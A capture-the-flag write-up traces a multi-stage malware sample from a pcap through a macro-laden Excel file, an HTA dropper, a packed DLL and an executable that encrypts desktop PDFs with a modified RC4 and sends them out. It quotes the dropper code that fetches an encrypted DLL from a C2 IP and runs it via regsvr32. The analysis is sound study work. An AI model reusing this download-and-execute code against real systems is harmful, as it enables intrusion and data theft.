
## Challenge goal : 

Challenge starts with a pcap file. The task : recover what was exfiltrated


## Stage 1, Flag 1

HTTP objects show two things : a long string of hex encoded data that appears encrypted, and a xlsm file (excel with macro).

Since this is a malware analysis challenge, let's start with the macros. they can easily be dumped with olevba.

the macros are lightly obfuscated, but there is a pretty obvious part : 
```vba

f = Chr(72) & Chr(70) & Chr(45) & MD5Hex(Environ$(cqw543hi(Chr(54) & "" & Chr(58) & "8" & "%" & " " & Chr(33) & "0" & "'" & ";" & "" & "4" & "" & Chr(56) & "" & "0")))
'flag ^

```

This is suspicious. Unfortunately, the flag we get isn't accepted. let's deobfuscate a little bit. we can figure out the obfuscated strings dynamically, by using the vba debugger included inside excel. Modifying the code a little bit so we can place breakpoints and watches, we get this : 

[fig_1](pictures/fig_1.png)


```vba

f = "HF-" & MD5Hex(Environ$("computer-name"))
'flag ^

```

We need the computer name of the intended target. luckily, we have a pcap

[fig_3](pictures/fig_3.png)

This nets us a flag. Let's keep going. We can see from the code that the macro writes a file in `%programdata%/esfegserg.htm`
Unfortunately, that file gets overwritten with garbage and doesn't execute quite right. But we can rebuild it.
```vba
Set A = fs.CreateTextFile(p & "\esfegserg.htm", True)
A.WriteLine (Range("U" & cqw543hi("" & "d" & "" & Chr(103) & "" & Chr(102))).Value)
A.WriteLine (Range("V" & cqw543hi("" & "d" & "" & "g" & "" & "f" & "")).Value)
A.WriteLine (Range("W" & cqw543hi("" & "" & Chr(100) & "" & Chr(103) & "" & Chr(102) & "")).Value)
A.Close
o.Run ("mshta " & p & "\esfegserg.htm")
```

Using the same dynamic analysis techniques, we figure out that the data is read from `U123`, `V123` and `AW123`. All on the same hidden row This data is decrypted before, read, and re-encrypted. 

With conveniently placed breakpoint, We can simply read the three cells and rebuild the htm file. 

[fig_4](pictures/fig_4.png)


## Stage 2

Stage two is a htm file, combining vba and Jscript.

Most of this file is a Jscript implementation of AES. the beginning has a vbscript stub containing a flag that we can ignore : in the pro CTF, only the first and last flag count. We're not there yet.


```vb
<!-- HF-da365847ae70bf6f777a676d3b40d60b -->
<script language=""VBScript""> 
    Sub RunProgram(s, ss)
  Set o = CreateObject(""Wscript.Shell"")
  Set f = CreateObject(""Scripting.FileSystemObject"")
  Set p = o.ExpandEnvironmentStrings(""%Temp%"")
  Set a = f.CreateTextFile(p & ""\\aafkjfjf.dll"", True)
  a.WriteLine(ss)
  a.Close()
        o.Run (s & p & ""\\aafkjfjf.dll"")
    End Sub
</script>
```

The footer is where the magic happens: the script generates an iv/key combo, sends them to a c2 that replies with the next stage, 
a hex encoded, AES encrypted PE file. 

```javascript
 var url = ""http://134.209.233.27:5000/a?u="";
 var iv = gdgfdgege(Math[""random""]().toString()).substring(0, 16);
 var key = gdgfdgege(Math[""random""]().toString());
 
 xhr = new ActiveXObject(""msxml2.xmlhttp"");
 xhr[""open""](""GET"", url[""concat""](iv).concat(""&j="").concat(key), 0);
 xhr[""send""]();
 var res = xhr[""responseText""];
 
 key = aesjs.utils.utf8.toBytes(key);
 iv = aesjs.utils.utf8.toBytes(iv);
 
 var aesCtr = new aesjs.ModeOfOperation.cbc((key), (iv));
 var encryptedBytes = aesCtr.decrypt(aesjs.utils.hex.toBytes(res));
 
 var x = String.fromCharCode.apply(String, encryptedBytes);

 for (var i = 0; i < 5; i++) {
  setTimeout(function() {
    RunProgram(""regsvr32 /s "", x);
  }, 1000*i);
 }
```

## Stage 3

We're getting close. This dll is is packed, so we'll need to unpack it. When opened in Ghidra, we see an enormous (14k) stack string getting built, right before Ghidra chokes to death trying do decompile this enormous function. It would be easy to recover this data, but Ghidra can't handle this sample at all, so we'll need a workaround. 

[fig 5](pictures/fig_5.png)
*like this, but 14 000 times*

We used objdump to dump the disassemble hex, and combined with sed and IPython were able to recover the next part


The dll also has a `getFlag` export, but this is not what we're after : We want the last flag, what was exfiltrated. 

## Stage 3, part 2


The resulting file starts with garbled data, but we can quickly see a PE file in there. 

[fig 6](pictures/fig_6.png)

What comes before doesn't look random enough to be encrypted, so we assume that the stub above the PE file is shellcode designed to load and map the executable file in memory, much like the PE loader would (parsing import, relocations, etc. ) Let's focus on the PE file itself. 

RE shows this exe searches for pdfs on the desktop, encrypts and b64 the content, and then send them to a c2 over a raw socket on port 1463.



[fig 7](pictures/fig_7.png)
*looking for pdfs*

[fig 8](pictures/fig_8.png)
*and sending it*

Searching in wireshark, we can see this happening. This is the payload we need to decrypt! Great, all we need to do is figure out how this is encrypted. 

[fig 9](pictures/fig_9.png)



## Stage 3, part 3

At first glance the encryption algorithm looks slightly opaque. 
```c
  do {
    abStack65536[len] = (byte)len;
    len = len + 1;
  } while (len < 0xf4);
  uVar3 = 0;
  len = 0xf4;
  do {
    bVar2 = abStack65536[uVar3];
    iVar4 = (int)((uint)bVar2 + (uint)(byte)(&DAT_00403130)[uVar3 % 0xd] + iVar4) % 0xf4;
    abStack65536[uVar3] = abStack65536[iVar4];
    uVar3 = uVar3 + 1;
    abStack65536[iVar4] = bVar2;
  } while ((int)uVar3 < 0xf4);
  pcVar9 = (code *)0x0;
  iVar4 = 0;
  pcVar5 = buf;
  do {
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + 1;
  } while (cVar1 != 0);
  pcVar7 = (char *)0x0;
  if (pcVar5 != buf + 1) {
    do {
      pcVar9 = (code *)((int)(pcVar9 + 1) % 0xf4);
      bVar2 = abStack65536[(int)pcVar9];
      iVar4 = (int)(iVar4 + (uint)bVar2) % 0xf4;
      abStack65536[(int)pcVar9] = abStack65536[iVar4];
      abStack65536[iVar4] = bVar2;
      abStack62888[(int)pcVar7] =
           abStack65536[((uint)abStack65536[(int)pcVar9] + (uint)bVar2) % 0xf4] ^
           (buf + -(int)abStack62888)[(int)(abStack62888 + (int)pcVar7)] ^ 0x25;
      pcVar7 = pcVar7 + 1;
      pcVar8 = pcVar9;
    } while (pcVar7 < pcVar5 + -(int)(buf + 1));
  }
```

However, this is very similar to RC4. 

there's the key scheduling : 
```c
do {
  abStack65536[len] = (byte)len;
  len = len + 1;
} while (len < 0xf4);
uVar3 = 0;
len = 0xf4;               // <--- 0xF4? That's not 255
do {
  bVar2 = abStack65536[uVar3];
  iVar4 = (int)((uint)bVar2 + (uint)(byte)(&DAT_00403130)[uVar3 % 0xd] + iVar4) % 0xf4;
  abStack65536[uVar3] = abStack65536[iVar4];
  uVar3 = uVar3 + 1;
  abStack65536[iVar4] = bVar2;
} while ((int)uVar3 < 0xf4);
```

```
for i from 0 to 255
    S[i] := i
endfor
j := 0
for i from 0 to 255
    j := (j + S[i] + key[i mod keylength]) mod 256
    swap values of S[i] and S[j]
endfor
```
*Key scheduling algorithm from RC4 (wikipedia)*

An the Pseudo random generation algorithm 

```
do {
  pcVar9 = (code *)((int)(pcVar9 + 1) % 0xf4);
  bVar2 = abStack65536[(int)pcVar9];
  iVar4 = (int)(iVar4 + (uint)bVar2) % 0xf4;
  abStack65536[(int)pcVar9] = abStack65536[iVar4];
  abStack65536[iVar4] = bVar2;
  abStack62888[(int)pcVar7] =
       abStack65536[((uint)abStack65536[(int)pcVar9] + (uint)bVar2) % 0xf4] ^
       (buf + -(int)abStack62888)[(int)(abStack62888 + (int)pcVar7)] ^ 0x25;     // <-- what's that!
  pcVar7 = pcVar7 + 1;
  pcVar8 = pcVar9;
} while (pcVar7 < pcVar5 + -(int)(buf + 1));
```
```
i := 0
j := 0
while GeneratingOutput:
    i := (i + 1) mod 256
    j := (j + S[i]) mod 256
    swap values of S[i] and S[j]
    K := S[(S[i] + S[j]) mod 256]
    output K
endwhile
```
*RC4's PRGA (wikipedia)*

An the Pseudo random generation algorithm 

```
do {
  pcVar9 = (code *)((int)(pcVar9 + 1) % 0xf4);
  bVar2 = abStack65536[(int)pcVar9];
  iVar4 = (int)(iVar4 + (uint)bVar2) % 0xf4;
  abStack65536[(int)pcVar9] = abStack65536[iVar4];
  abStack65536[iVar4] = bVar2;
  abStack62888[(int)pcVar7] =
       abStack65536[((uint)abStack65536[(int)pcVar9] + (uint)bVar2) % 0xf4] ^
       (buf + -(int)abStack62888)[(int)(abStack62888 + (int)pcVar7)] ^ 0x25;
  pcVar7 = pcVar7 + 1;
  pcVar8 = pcVar9;
} while (pcVar7 < pcVar5 + -(int)(buf + 1));
```
```
i := 0
j := 0
while GeneratingOutput:
    i := (i + 1) mod 256
    j := (j + S[i]) mod 256
    swap values of S[i] and S[j]
    K := S[(S[i] + S[j]) mod 256]
    output K
endwhile
```

But the algorithm has been modified. The S array is only `244` (`0xF4`) bytes long, and there's an additional `xor 0x25` on every bytes of the keystream. But these changes are rather minor, we can probably adapt an existing RC4 implementation to include them. We tested that theory : 

```python
from pathlib import Path
from base64 import b64decode, b64encode
from hexdump import hexdump
from itertools import cycle
def xor(a,b):
    return bytes([x^y for x,y in zip(cycle(a), b)])

payload = b64decode(Path('payload').read_text())

key = bytes.fromhex("D8532BA6B9797E0D3EA9BF51AB")


# code modified from https://github.com/DavidBuchanan314/rc4

class RC4:   # NOW WITH A 244 bytes S-ARRAY!
    """
    This class implements the RC4 streaming cipher.
    
    Derived from http://cypherpunks.venona.com/archive/1994/09/msg00304.html
    """

    def __init__(self, key, streaming=True):
        assert(isinstance(key, (bytes, bytearray)))

        # key scheduling
        S = list(range(0xF4))
        j = 0
        for i in range(0xF4):
            j = (S[i] + key[i % len(key)] + j) % 0xF4
            S[i], S[j] = S[j], S[i]
        self.S = S

        # in streaming mode, we retain the keystream state between crypt()
        # invocations
        if streaming:
            self.keystream = self._keystream_generator()
        else:
            self.keystream = None

    def crypt(self, data):
        """
        Encrypts/decrypts data (It's the same thing!)
        """
        assert(isinstance(data, (bytes, bytearray)))
        keystream = self.keystream or self._keystream_generator()
        return bytes([a ^ b for a, b in zip(data, keystream)])

    def _keystream_generator(self):
        """
        Generator that returns the bytes of keystream
        """
        S = self.S.copy()
        x = y = 0
        while True:
            x = (x + 1) % 0xf4
            y = (S[x] + y) % 0xf4
            S[x], S[y] = S[y], S[x]
            i = (S[x] + S[y]) % 0xf4
            yield S[i]


cipher = RC4(key)
clear = xor(bytes([0x25]), cipher.crypt(payload))   # And the xor 0x25
clear = b64decode(clear)
Path('win.pdf').write_bytes(clear)
hexdump(clear)

```

and in the pdf...

[fig 10](pictures/fig_10.png)


